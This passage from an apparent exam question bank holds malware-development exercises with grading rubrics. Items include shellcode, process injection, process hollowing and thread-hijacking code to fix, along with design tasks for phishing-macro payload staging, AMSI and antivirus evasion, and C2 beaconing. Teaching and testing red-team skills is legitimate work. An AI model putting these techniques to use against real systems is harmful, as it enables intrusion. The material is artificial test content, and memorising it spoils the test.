      { id: "stub-logic", description: "Outlines the stub: decrypt/decompress, allocate memory, copy sections, process relocations, resolve imports, set protections, jump to OEP", points: 2, keywords: ["decrypt", "decompress", "allocate", "sections", "relocations", "imports", "OEP", "entry point", "VirtualAlloc"], check: "Student describes a coherent unpacking sequence covering at least 4 of the major steps" },
      { id: "import-handling", description: "Explains how the stub resolves the original PE's imports (manual IAT resolution or via LoadLibrary/GetProcAddress)", points: 2, keywords: ["IAT", "imports", "LoadLibrary", "GetProcAddress", "resolve", "manual"], check: "Student addresses how the original PE's imports are resolved by the stub" },
      { id: "section-layout", description: "Describes what the packed PE looks like: minimal imports (kernel32 for VirtualAlloc/VirtualProtect), one or two sections (.text for stub, .data or .rsrc for payload)", points: 2, keywords: ["minimal imports", "section", ".text", ".data", "stub", "kernel32", "small IAT"], check: "Student describes the packed PE's minimal structure" },
      { id: "anti-analysis", description: "Names at least two anti-analysis features: timing checks, API hashing, import obfuscation, junk code insertion, anti-debug, control flow flattening", points: 2, keywords: ["anti-debug", "API hashing", "timing", "junk code", "obfuscation", "control flow", "IsDebuggerPresent", "rdtsc"], check: "Student proposes at least two concrete anti-analysis features for the stub" },
    ],
    gaps: [
      { if_missing: "payload-storage", gap: "PE packing: payload embedding strategies" },
      { if_missing: "stub-logic", gap: "PE unpacking stub design and execution flow" },
      { if_missing: "import-handling", gap: "Manual import resolution in packed PEs" },
      { if_missing: "section-layout", gap: "Packed PE header and section design" },
      { if_missing: "anti-analysis", gap: "Anti-analysis techniques for packer stubs" },
    ],
  },
},

{
  competencyId: "win-internals",
  subTopic: "loader-behavior",
  questionType: "predict_output",
  difficulty: 1,
  questionText: `Given this simple DLL and program:

\`\`\`c
// mydll.c - compiled to mydll.dll
#include <windows.h>
#include <stdio.h>

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD reason, LPVOID reserved) {
    switch (reason) {
        case DLL_PROCESS_ATTACH: printf("DLL: ATTACH\\n"); break;
        case DLL_PROCESS_DETACH: printf("DLL: DETACH\\n"); break;
        case DLL_THREAD_ATTACH:  printf("DLL: THREAD_ATTACH\\n"); break;
        case DLL_THREAD_DETACH:  printf("DLL: THREAD_DETACH\\n"); break;
    }
    return TRUE;
}

// main.c
#include <windows.h>
#include <stdio.h>

DWORD WINAPI ThreadFunc(LPVOID p) {
    printf("Thread running\\n");
    return 0;
}

int main() {
    HMODULE h = LoadLibraryA("mydll.dll");
    printf("Loaded\\n");
    HANDLE t = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);
    WaitForSingleObject(t, INFINITE);
    CloseHandle(t);
    FreeLibrary(h);
    printf("Done\\n");
    return 0;
}
\`\`\`

List the exact sequence of printed messages, in order.`,
  rubric: {
    maxScore: 6,
    criteria: [
      { id: "attach-order", description: "DLL: ATTACH appears before Loaded", points: 2, keywords: ["ATTACH", "before", "Loaded", "LoadLibrary", "DLL_PROCESS_ATTACH"], check: "Student correctly places DLL_PROCESS_ATTACH output before the Loaded message" },
      { id: "thread-notifications", description: "DLL: THREAD_ATTACH and Thread running appear (in that order), followed by DLL: THREAD_DETACH", points: 2, keywords: ["THREAD_ATTACH", "THREAD_DETACH", "Thread running", "CreateThread"], check: "Student includes both thread attach/detach notifications in correct order around Thread running" },
      { id: "detach-order", description: "DLL: DETACH appears after FreeLibrary, before Done", points: 2, keywords: ["DETACH", "FreeLibrary", "before Done", "DLL_PROCESS_DETACH"], check: "Student places DLL_PROCESS_DETACH between FreeLibrary and Done" },
    ],
    gaps: [
      { if_missing: "attach-order", gap: "DllMain notification timing during LoadLibrary" },
      { if_missing: "thread-notifications", gap: "DLL thread attach/detach notification behavior" },
      { if_missing: "detach-order", gap: "DllMain notification timing during FreeLibrary" },
    ],
  },
},

// --- maldev-techniques (Malware development techniques) ---

{
  competencyId: "maldev-techniques",
  subTopic: "shellcode-basics",
  questionType: "predict_output",
  difficulty: 1,
  questionText: `Here is a minimal position-independent shellcode stub for x64 Windows. What does it do?

\`\`\`asm
xor   rcx, rcx              ; (1)
mov   rax, gs:[rcx + 0x60]  ; (2)
mov   rax, [rax + 0x18]     ; (3)
mov   rsi, [rax + 0x20]     ; (4)
lodsq                        ; (5)
xchg  rsi, rax
lodsq                        ; (6)
mov   rbx, [rax + 0x20]     ; (7)
; rbx now holds ????
\`\`\`

1. What value is in rbx at the end?
2. Why is rcx zeroed at the start instead of using an immediate value for gs:[0x60]?
3. Why is this technique necessary in shellcode but not in normal C programs?`,
  rubric: {
    maxScore: 6,
    criteria: [
      { id: "kernel32-base", description: "Identifies that rbx holds kernel32.dll's base address", points: 2, keywords: ["kernel32", "base address", "DllBase", "module"], check: "Student identifies rbx as kernel32.dll's base address" },
      { id: "null-byte-avoidance", description: "Explains that xor rcx,rcx avoids null bytes that mov rcx,0x60 would introduce", points: 2, keywords: ["null byte", "xor", "avoid", "0x00", "bad characters", "position independent"], check: "Student explains the null-byte avoidance reason for xor zeroing" },
      { id: "pic-necessity", description: "Explains shellcode must be position-independent (no IAT, no fixed addresses), so it resolves APIs dynamically via PEB walking", points: 2, keywords: ["position independent", "PIC", "no IAT", "no imports", "dynamic", "PEB", "runtime resolution"], check: "Student explains why shellcode cannot use normal import mechanisms" },
    ],
    gaps: [
      { if_missing: "kernel32-base", gap: "PEB walking to resolve module base addresses" },
      { if_missing: "null-byte-avoidance", gap: "Shellcode null-byte constraints and encoding" },
      { if_missing: "pic-necessity", gap: "Position-independent code requirements for shellcode" },
    ],
  },
},

{
  competencyId: "maldev-techniques",
  subTopic: "process-injection",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText: `This classic process injection code has multiple OPSEC problems that make it easy for EDR to detect. Identify them:

\`\`\`c
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);

LPVOID remoteBuf = VirtualAllocEx(hProcess, NULL, shellcodeSize,
    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

WriteProcessMemory(hProcess, remoteBuf, shellcode, shellcodeSize, NULL);

HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
    (LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL);

WaitForSingleObject(hThread, INFINITE);
\`\`\`

List at least four detection indicators in this code.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "rwx-memory", description: "Identifies PAGE_EXECUTE_READWRITE as a major indicator; RWX memory is suspicious and flagged by EDR", points: 2, keywords: ["RWX", "PAGE_EXECUTE_READWRITE", "execute readwrite", "suspicious", "write then execute"], check: "Student flags the RWX memory allocation as a detection indicator" },
      { id: "all-access", description: "Notes PROCESS_ALL_ACCESS is overly broad; minimal rights (VM_WRITE, VM_OPERATION, CREATE_THREAD) are less suspicious", points: 2, keywords: ["PROCESS_ALL_ACCESS", "overly broad", "minimal rights", "PROCESS_VM_WRITE", "PROCESS_VM_OPERATION"], check: "Student identifies excessive process access rights as an indicator" },
      { id: "createremotethread", description: "Identifies CreateRemoteThread as heavily monitored by EDR; well-known injection primitive", points: 2, keywords: ["CreateRemoteThread", "monitored", "hooked", "injection", "well-known"], check: "Student flags CreateRemoteThread as a monitored API" },
      { id: "api-sequence", description: "Notes the classic OpenProcess/VirtualAllocEx/WriteProcessMemory/CreateRemoteThread sequence is a known signature", points: 2, keywords: ["sequence", "pattern", "signature", "chain", "classic", "OpenProcess", "WriteProcessMemory"], check: "Student identifies the API call sequence itself as a behavioral signature" },
    ],
    gaps: [
      { if_missing: "rwx-memory", gap: "Memory protection indicators (RWX detection)" },
      { if_missing: "all-access", gap: "Process access rights OPSEC" },
      { if_missing: "createremotethread", gap: "EDR monitoring of thread creation APIs" },
      { if_missing: "api-sequence", gap: "Behavioral signature detection of injection API sequences" },
    ],
  },
},

{
  competencyId: "maldev-techniques",
  subTopic: "dll-injection",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `Explain step by step how classic DLL injection via CreateRemoteThread + LoadLibrary works. Then explain why this specific approach is easily detectable compared to manual mapping.

Your explanation should cover:
1. How the DLL path string gets into the target process
2. Why LoadLibraryA's address is the same across processes
3. What artifacts this technique leaves behind (at least three)`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "mechanism", description: "Explains: allocate memory in target with VirtualAllocEx, write DLL path with WriteProcessMemory, create thread at LoadLibraryA address with path as argument", points: 2, keywords: ["VirtualAllocEx", "WriteProcessMemory", "DLL path", "CreateRemoteThread", "LoadLibraryA", "argument"], check: "Student describes the complete injection mechanism: allocate, write path, create thread at LoadLibraryA" },
      { id: "aslr-same-base", description: "Explains kernel32.dll (containing LoadLibraryA) is loaded at the same base address across processes due to ASLR being per-boot, not per-process, for system DLLs", points: 2, keywords: ["ASLR", "same base", "per-boot", "system DLL", "kernel32", "shared", "same address"], check: "Student explains why LoadLibraryA has the same address across processes" },
      { id: "artifacts", description: "Lists artifacts: DLL appears in loaded modules list, DllMain called with PROCESS_ATTACH, file on disk, visible in PEB module list, CreateRemoteThread logged by ETW", points: 2, keywords: ["loaded modules", "PEB", "module list", "file on disk", "DllMain", "ETW", "event log", "thread creation"], check: "Student lists at least 3 detectable artifacts of DLL injection" },
      { id: "manual-map-advantage", description: "Explains manual mapping avoids: DLL in module list, LoadLibrary API call, file-backed section object, and registered DllNotification callbacks", points: 2, keywords: ["manual map", "not in module list", "no LoadLibrary call", "file-backed", "DllNotificationCallback", "stealth"], check: "Student explains why manual mapping is stealthier than LoadLibrary injection" },
    ],
    gaps: [
      { if_missing: "mechanism", gap: "Classic DLL injection mechanism (LoadLibrary + CreateRemoteThread)" },
      { if_missing: "aslr-same-base", gap: "ASLR behavior for system DLLs across processes" },
      { if_missing: "artifacts", gap: "Forensic artifacts of DLL injection" },
      { if_missing: "manual-map-advantage", gap: "Manual mapping vs LoadLibrary injection trade-offs" },
    ],
  },
},

{
  competencyId: "maldev-techniques",
  subTopic: "process-hollowing",
  questionType: "fix_code",
  difficulty: 3,
  questionText: `This process hollowing implementation creates the process but the hollowed process crashes immediately upon resuming. Find and fix the bugs:

\`\`\`c
// Create suspended process
STARTUPINFOA si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcessA("C:\\\\Windows\\\\System32\\\\svchost.exe", NULL, NULL, NULL,
    FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// Read target PEB to get image base
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread, &ctx);

// Unmap the original image
typedef NTSTATUS(WINAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
pNtUnmapViewOfSection NtUnmapViewOfSection =
    (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection");

PVOID imageBase;
ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &imageBase, sizeof(PVOID), NULL);
NtUnmapViewOfSection(pi.hProcess, imageBase);

// Allocate and write payload
PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payloadBuf;
PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payloadBuf + dosHeader->e_lfanew);

PVOID newBase = VirtualAllocEx(pi.hProcess, imageBase,
    ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// Write headers
WriteProcessMemory(pi.hProcess, newBase, payloadBuf,
    ntHeaders->OptionalHeader.SizeOfHeaders, NULL);

// Write sections
PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
    WriteProcessMemory(pi.hProcess, (PBYTE)newBase + section[i].VirtualAddress,
        payloadBuf + section[i].PointerToRawData, section[i].SizeOfRawData, NULL);
}

// Set entry point and resume
ctx.Rcx = (DWORD64)newBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
\`\`\`

Identify at least two bugs that cause the crash.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "peb-imagebase", description: "The code does not update the ImageBase in the remote PEB; the loader will read the old base and fail. Must WriteProcessMemory to ctx.Rdx+0x10 with newBase", points: 3, keywords: ["PEB", "ImageBase", "Rdx", "0x10", "WriteProcessMemory", "update", "remote PEB"], check: "Student identifies missing PEB ImageBase update as a bug" },
      { id: "relocation-missing", description: "If newBase != payload's preferred ImageBase, relocations must be processed but the code doesn't apply them", points: 3, keywords: ["relocation", "base relocation", "preferred base", "delta", "IMAGE_BASE_RELOCATION", "fixup"], check: "Student identifies that relocations are not processed when base address differs" },
      { id: "additional-issues", description: "Identifies any additional issue: svchost.exe needs command line args to not crash, RWX is suspicious, no error checking, or section permissions not set individually", points: 2, keywords: ["svchost", "command line", "arguments", "RWX", "error check", "section permissions"], check: "Student identifies at least one additional problem beyond the two main bugs" },
    ],
    gaps: [
      { if_missing: "peb-imagebase", gap: "PEB ImageBase patching in process hollowing" },
      { if_missing: "relocation-missing", gap: "Relocation processing for hollowed payloads loaded at non-preferred base" },
    ],
  },
},

{
  competencyId: "maldev-techniques",
  subTopic: "apc-injection",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `Explain how APC (Asynchronous Procedure Call) injection works as an alternative to CreateRemoteThread. Address:

1. What is a user-mode APC and when does it execute?
2. Walk through the API sequence for APC injection
3. What is the "alertable state" requirement and how does it affect target selection?
4. What is "Early Bird" injection and why is it considered more reliable than standard APC injection?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "apc-mechanism", description: "Explains that user APCs are queued to a thread and execute when the thread enters an alertable wait state (SleepEx, WaitForSingleObjectEx, etc.)", points: 2, keywords: ["APC", "alertable", "queue", "SleepEx", "WaitForSingleObjectEx", "alertable wait", "user-mode APC"], check: "Student explains the APC queuing mechanism and alertable state requirement" },
      { id: "api-sequence", description: "Describes: OpenProcess, VirtualAllocEx, WriteProcessMemory, OpenThread, QueueUserAPC with shellcode address", points: 2, keywords: ["QueueUserAPC", "OpenThread", "VirtualAllocEx", "WriteProcessMemory", "shellcode address"], check: "Student provides the correct API sequence for APC injection" },
      { id: "alertable-limitation", description: "Explains that the target thread must enter an alertable wait; not all threads do this, making target selection critical and injection unreliable for arbitrary processes", points: 2, keywords: ["alertable", "not all threads", "unreliable", "target selection", "wait state", "blocking call"], check: "Student explains the alertable state limitation and its practical impact on target selection" },
      { id: "early-bird", description: "Explains Early Bird: create a suspended process, queue APC to the initial thread before it starts, resume; the APC fires during thread initialization (before main code runs) so alertable state is guaranteed", points: 2, keywords: ["Early Bird", "suspended", "initial thread", "before main", "guaranteed", "thread initialization", "NtTestAlert"], check: "Student explains Early Bird injection and why it solves the alertable state problem" },
    ],
    gaps: [
      { if_missing: "apc-mechanism", gap: "User-mode APC mechanism and alertable wait states" },
      { if_missing: "api-sequence", gap: "API sequence for APC injection implementation" },
      { if_missing: "alertable-limitation", gap: "Alertable state constraint and target thread selection" },
      { if_missing: "early-bird", gap: "Early Bird injection technique and thread initialization timing" },
    ],
  },
},

{
  competencyId: "maldev-techniques",
  subTopic: "persistence-registry",
  questionType: "compare_contrast",
  difficulty: 4,
  questionText: `Compare the following Windows persistence mechanisms in terms of reliability, stealth, privilege requirements, and detection ease:

1. HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
2. Scheduled Task (schtasks or ITaskService COM)
3. DLL search order hijacking
4. COM object hijacking (HKCU\\CLSID)

For each, explain: how it triggers execution, what privileges are needed, what artifacts it leaves, and how a defender would detect it.`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "run-key", description: "Explains Run key: triggers at logon, no admin needed for HKCU, leaves registry artifact, easily detected by autoruns/reg queries", points: 2, keywords: ["Run key", "logon", "HKCU", "no admin", "autoruns", "registry", "startup"], check: "Student describes Run key mechanics, privileges, and detection" },
      { id: "schtasks", description: "Explains scheduled tasks: flexible triggers (logon/time/event), admin needed for SYSTEM tasks, visible in Task Scheduler, detectable via schtasks /query or event logs", points: 2, keywords: ["scheduled task", "schtasks", "trigger", "Task Scheduler", "event log", "4698", "XML"], check: "Student describes scheduled task mechanics, privileges, and detection" },
      { id: "dll-hijack", description: "Explains DLL hijacking: drops DLL in app directory that's searched before system32, triggers when app runs, requires write to app directory, detected by comparing expected vs actual DLL paths", points: 3, keywords: ["DLL hijacking", "search order", "app directory", "System32", "proxying", "side-loading", "write access"], check: "Student describes DLL hijacking mechanics and detection" },
      { id: "com-hijack", description: "Explains COM hijacking: overrides CLSID in HKCU (takes precedence over HKLM), triggers when COM object instantiated, no admin needed, stealthy because per-user HKCU keys are less monitored", points: 3, keywords: ["COM hijack", "CLSID", "HKCU", "InprocServer32", "precedence", "HKLM", "CoCreateInstance", "per-user"], check: "Student describes COM hijacking mechanics and its stealth advantage" },
    ],
    gaps: [
      { if_missing: "run-key", gap: "Registry Run key persistence mechanism" },
      { if_missing: "schtasks", gap: "Scheduled task persistence and detection" },
      { if_missing: "dll-hijack", gap: "DLL search order hijacking for persistence" },
      { if_missing: "com-hijack", gap: "COM object hijacking for persistence" },
    ],
  },
},

{
  competencyId: "maldev-techniques",
  subTopic: "payload-staging",
  questionType: "design_solution",
  difficulty: 4,
  questionText: `Design a multi-stage payload delivery system for a red team engagement. The initial access vector is a phishing email with a macro-enabled document.

Describe:
1. Stage 0 (macro): What does the macro do? How does it fetch stage 1? How do you avoid detection by email gateways and AMSI?
2. Stage 1 (stager): What is the stager? How does it download the main implant? What format is it in?
3. Stage 2 (implant): How does the implant load into memory? How does it communicate back to the C2?
4. Why use multiple stages instead of a single payload?

Address OPSEC considerations at each stage.`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "stage0-macro", description: "Describes a macro that downloads or decodes a stager: uses WinHTTP/URLDownloadToFile/PowerShell, employs string obfuscation or stomping to evade AMSI, possibly uses template injection to keep the doc clean", points: 2, keywords: ["macro", "VBA", "download", "WinHTTP", "PowerShell", "AMSI", "obfuscation", "template injection", "stomping"], check: "Student describes a viable macro-based initial access with at least one evasion consideration" },
      { id: "stage1-stager", description: "Describes a small stager (e.g., shellcode runner, PowerShell cradle, or compiled exe) that fetches the main implant over HTTPS, validates the C2, and loads stage 2 in memory", points: 2, keywords: ["stager", "HTTPS", "download", "shellcode runner", "in-memory", "cradle", "validate"], check: "Student describes a stager that retrieves the implant with network OPSEC" },
      { id: "stage2-implant", description: "Describes reflective loading or manual mapping of the implant DLL/shellcode, C2 communication channel (HTTPS, DNS, named pipes), and sleep/beacon pattern", points: 3, keywords: ["reflective", "manual map", "C2", "HTTPS", "beacon", "sleep", "DNS", "named pipe", "in-memory"], check: "Student describes in-memory implant loading and C2 communication" },
      { id: "staging-rationale", description: "Explains why multi-staging: reduces initial payload size, separates disposable components from valuable implant, allows C2 to gate delivery, limits exposure if early stages are caught", points: 2, keywords: ["small", "disposable", "gate", "caught", "minimize", "exposure", "size", "separate"], check: "Student explains the tactical reasons for multi-stage delivery" },
      { id: "opsec-considerations", description: "Addresses at least two OPSEC concerns: domain fronting or CDN for C2, encrypting payloads in transit, jitter in beacon timing, user-agent spoofing, certificate pinning", points: 1, keywords: ["OPSEC", "domain fronting", "encrypt", "jitter", "user-agent", "certificate", "CDN", "proxy"], check: "Student discusses specific OPSEC practices" },
    ],
    gaps: [
      { if_missing: "stage0-macro", gap: "Macro-based initial access techniques and AMSI evasion" },
      { if_missing: "stage1-stager", gap: "Stager design for payload delivery" },
      { if_missing: "stage2-implant", gap: "In-memory implant loading and C2 architecture" },
      { if_missing: "staging-rationale", gap: "Tactical reasoning behind multi-stage payload delivery" },
    ],
  },
},

{
  competencyId: "maldev-techniques",
  subTopic: "reflective-loading",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `Explain reflective DLL loading (as implemented in Stephen Fewer's ReflectiveDLLInjection). Walk through:

1. What makes a DLL "reflective" — what is added to a normal DLL?
2. How does the reflective loader bootstrap itself without any imports?
3. What is the sequence of operations the reflective loader performs?
4. Why is this technique considered stealthier than standard LoadLibrary-based injection?

Include the key technical details that distinguish this from a simple manual mapper.`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "reflective-export", description: "Explains that a reflective DLL exports a ReflectiveLoader function; this function IS the manual mapper, compiled into the DLL itself", points: 2, keywords: ["ReflectiveLoader", "export", "self-loading", "contained", "manual mapper", "within the DLL"], check: "Student explains that the loader function is embedded within the DLL itself" },
      { id: "bootstrap", description: "Describes how the loader finds its own base in memory (walking backwards to MZ header), then resolves kernel32 via PEB walking to get LoadLibraryA/GetProcAddress for dependencies", points: 2, keywords: ["MZ header", "walk backward", "find own base", "PEB", "kernel32", "GetProcAddress", "bootstrap"], check: "Student explains the bootstrapping process: finding own base and resolving initial APIs" },
      { id: "loader-sequence", description: "Outlines: allocate new memory, copy sections, process relocations, resolve imports, set section protections, call DllMain with DLL_PROCESS_ATTACH", points: 2, keywords: ["allocate", "copy sections", "relocations", "imports", "protections", "DllMain", "DLL_PROCESS_ATTACH"], check: "Student describes the reflective loader's operation sequence" },
      { id: "stealth-reasons", description: "Explains stealth: DLL never touches disk, not registered in PEB module list, no LoadLibrary call that triggers LdrLoadDll hooks or DLL notification callbacks", points: 2, keywords: ["no disk", "not in PEB", "no LoadLibrary", "no notification", "LdrLoadDll", "module list", "unlinked"], check: "Student explains why reflective loading is stealthier than LoadLibrary injection" },
    ],
    gaps: [
      { if_missing: "reflective-export", gap: "Reflective DLL structure and self-contained loader concept" },
      { if_missing: "bootstrap", gap: "Reflective loader bootstrapping (base address discovery, PEB walking)" },
      { if_missing: "loader-sequence", gap: "Reflective loader PE mapping sequence" },
      { if_missing: "stealth-reasons", gap: "Stealth advantages of reflective loading over LoadLibrary injection" },
    ],
  },
},

{
  competencyId: "maldev-techniques",
  subTopic: "thread-hijacking",
  questionType: "fix_code",
  difficulty: 3,
  questionText: `This thread hijacking injection code is supposed to redirect an existing thread in the target process to execute shellcode, but it has bugs:

\`\`\`c
HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_SET_CONTEXT, FALSE, tid);

SuspendThread(hThread);

LPVOID remoteBuf = VirtualAllocEx(hProcess, NULL, shellcodeLen,
    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, remoteBuf, shellcode, shellcodeLen, NULL);

CONTEXT ctx;
ctx.ContextFlags = CONTEXT_CONTROL;
GetThreadContext(hThread, &ctx);

ctx.Rip = (DWORD64)remoteBuf;
SetThreadContext(hThread, &ctx);

ResumeThread(hThread);
\`\`\`

1. Identify the bugs (there are at least two).
2. Fix the code.
3. Explain what happens to the original thread's execution after the shellcode finishes — how would you make the thread return to its original code?`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "missing-get-context-rights", description: "OpenThread is missing THREAD_GET_CONTEXT; GetThreadContext will fail without it", points: 2, keywords: ["THREAD_GET_CONTEXT", "GetThreadContext", "access rights", "missing"], check: "Student identifies missing THREAD_GET_CONTEXT access right" },
      { id: "stack-alignment", description: "Shellcode must save/restore context or the thread will crash after shellcode returns; also RSP must be 16-byte aligned per x64 ABI before shellcode runs", points: 2, keywords: ["stack alignment", "16-byte", "RSP", "ABI", "save context", "restore", "crash after"], check: "Student identifies stack alignment or context preservation issues" },
      { id: "return-to-original", description: "Describes a technique to return to original code: push original RIP on stack before setting new RIP, or have shellcode save/restore all registers and jump back to original RIP", points: 2, keywords: ["push RIP", "original RIP", "save registers", "restore", "jmp back", "return address", "trampoline"], check: "Student describes a method to resume original thread execution after shellcode" },
      { id: "rwx-concern", description: "Notes that PAGE_EXECUTE_READWRITE should be split into write-then-change-to-execute to avoid RWX detection", points: 2, keywords: ["RWX", "VirtualProtect", "PAGE_READWRITE", "PAGE_EXECUTE_READ", "two-step", "split"], check: "Student recommends splitting RWX into write then execute-only" },
    ],
    gaps: [
      { if_missing: "missing-get-context-rights", gap: "Thread access rights for context manipulation" },
      { if_missing: "stack-alignment", gap: "x64 ABI stack alignment requirements for injected code" },
      { if_missing: "return-to-original", gap: "Thread execution resumption after shellcode injection" },
    ],
  },
},

{
  competencyId: "maldev-techniques",
  subTopic: "position-independent-code",
  questionType: "predict_output",
  difficulty: 2,
  questionText: `This x64 shellcode is supposed to call MessageBoxA("Hello"). It assembles without errors but crashes at runtime. Why?

\`\`\`asm
section .text
global _start

_start:
    sub   rsp, 0x28          ; shadow space + alignment
    xor   r9d, r9d           ; uType = 0
    lea   r8, [rel caption]  ; lpCaption
    lea   rdx, [rel text]    ; lpText
    xor   ecx, ecx           ; hWnd = NULL
    mov   rax, 0x00007FFA12340000  ; hardcoded address of MessageBoxA
    call  rax
    add   rsp, 0x28
    ret

section .data
caption: db "Title", 0
text:    db "Hello", 0
\`\`\`

1. What is wrong with this shellcode?
2. How would you fix it while keeping it position-independent?`,
  rubric: {
    maxScore: 6,
    criteria: [
      { id: "hardcoded-address", description: "Identifies that MessageBoxA's address is hardcoded and will differ across systems/reboots due to ASLR", points: 2, keywords: ["hardcoded", "ASLR", "address", "different", "reboot", "system", "not portable"], check: "Student identifies the hardcoded API address as the primary problem" },
      { id: "separate-section", description: "Notes that data in a separate .data section breaks position independence; the data must be inline in .text or accessed via RIP-relative addressing within the same section", points: 2, keywords: [".data", "separate section", "inline", "same section", "position independent", "RIP-relative"], check: "Student identifies the separate .data section as breaking PIC (or explains why lea [rel] across sections may fail when shellcode is extracted)" },
      { id: "fix-approach", description: "Describes the fix: resolve user32.dll and MessageBoxA at runtime via PEB walking + export table parsing, embed strings inline with call/pop or RIP-relative", points: 2, keywords: ["PEB walking", "export table", "GetProcAddress", "runtime", "inline strings", "call pop", "resolve dynamically"], check: "Student describes runtime API resolution as the fix" },
    ],
    gaps: [
      { if_missing: "hardcoded-address", gap: "ASLR impact on shellcode API resolution" },
      { if_missing: "separate-section", gap: "Position-independent data embedding in shellcode" },
      { if_missing: "fix-approach", gap: "Runtime API resolution techniques for shellcode (PEB + export table)" },
    ],
  },
},

{
  competencyId: "maldev-techniques",
  subTopic: "shellcode-encoding",
  questionType: "design_solution",
  difficulty: 4,
  questionText: `You have a 500-byte x64 shellcode payload that gets flagged by Windows Defender's static analysis. Design an encoding/decoding scheme that:

1. Eliminates null bytes from the encoded payload
2. Defeats simple signature matching
3. Has a small decoder stub (under 50 bytes)
4. Is not trivially identified as XOR-encoded

Describe the encoding algorithm, write pseudocode for the decoder stub, and explain the trade-offs of your approach versus more complex solutions (like custom crypters or polymorphic engines).`,
  rubric: {
    maxScore: 8,
    criteria: [
      { id: "encoding-scheme", description: "Describes a viable encoding scheme beyond simple single-byte XOR: rotating keys, multi-byte key, additive encoding, or custom cipher", points: 2, keywords: ["rotating key", "multi-byte", "additive", "rolling XOR", "key schedule", "LFSR", "custom cipher"], check: "Student proposes an encoding scheme more sophisticated than single-byte XOR" },
      { id: "null-elimination", description: "Addresses null byte elimination: explains how the encoder ensures no null bytes in output (key selection, byte mapping, or chained encoding)", points: 2, keywords: ["null byte", "eliminate", "avoid", "key selection", "no zeros", "byte mapping"], check: "Student explains how null bytes are avoided in the encoded output" },
      { id: "decoder-stub", description: "Provides pseudocode or assembly for a compact decoder stub that runs before the payload, decodes in-place, and jumps to the decoded shellcode", points: 2, keywords: ["decoder stub", "in-place", "loop", "decode", "jmp", "pseudocode", "counter"], check: "Student provides a workable decoder stub design" },
      { id: "trade-offs", description: "Discusses trade-offs: simple encoders are fast but easily emulated by AV sandboxes; polymorphic engines are harder to detect but complex and may themselves become signatures; entropy analysis can flag any encoded blob", points: 2, keywords: ["trade-off", "sandbox", "emulation", "polymorphic", "entropy", "complexity", "signature", "AV sandbox"], check: "Student discusses practical trade-offs of encoding approaches" },
    ],
    gaps: [
      { if_missing: "encoding-scheme", gap: "Shellcode encoding algorithms beyond simple XOR" },
      { if_missing: "null-elimination", gap: "Null byte elimination techniques in shellcode" },
      { if_missing: "decoder-stub", gap: "Decoder stub design for encoded shellcode" },
      { if_missing: "trade-offs", gap: "Trade-offs between encoding complexity and evasion effectiveness" },
    ],
  },
},

{
  competencyId: "maldev-techniques",
  subTopic: "module-stomping",
  questionType: "compare_contrast",
  difficulty: 5,
  questionText: `Compare module stomping (also called module overloading/DLL hollowing) with two other code execution techniques: classic VirtualAlloc-based shellcode injection and reflective DLL loading.

For each technique, analyze:
1. How memory is allocated and what its characteristics look like (private vs image-backed, RWX vs RX)
2. What appears in the process's loaded module list
3. What ETW and kernel callback telemetry each technique generates
4. Which is hardest for a memory scanner to detect and why

Conclude with when you would choose module stomping over the alternatives.`,
  rubric: {
    maxScore: 10,
    criteria: [
      { id: "module-stomp-mechanics", description: "Explains module stomping: load a legitimate DLL, overwrite its .text section with shellcode; the memory region appears as MEM_IMAGE (file-backed) with normal protections, not suspicious private executable memory", points: 3, keywords: ["legitimate DLL", "overwrite", ".text", "MEM_IMAGE", "file-backed", "image-backed", "not private"], check: "Student correctly describes module stomping mechanics and its MEM_IMAGE advantage" },
      { id: "virtualalloc-comparison", description: "Contrasts VirtualAlloc injection: creates MEM_PRIVATE + PAGE_EXECUTE regions, no module backing, trivially detected by scanners looking for private executable memory", points: 2, keywords: ["MEM_PRIVATE", "private executable", "VirtualAlloc", "no backing", "trivial", "scanner"], check: "Student explains why VirtualAlloc-based injection is the most detectable" },
      { id: "reflective-comparison", description: "Contrasts reflective loading: also uses private memory (MEM_PRIVATE), but loads a full DLL without registration; not in module list; detected by unbacked executable memory scans", points: 2, keywords: ["reflective", "private memory", "not registered", "module list", "unbacked", "executable"], check: "Student explains reflective loading's memory characteristics and detection profile" },
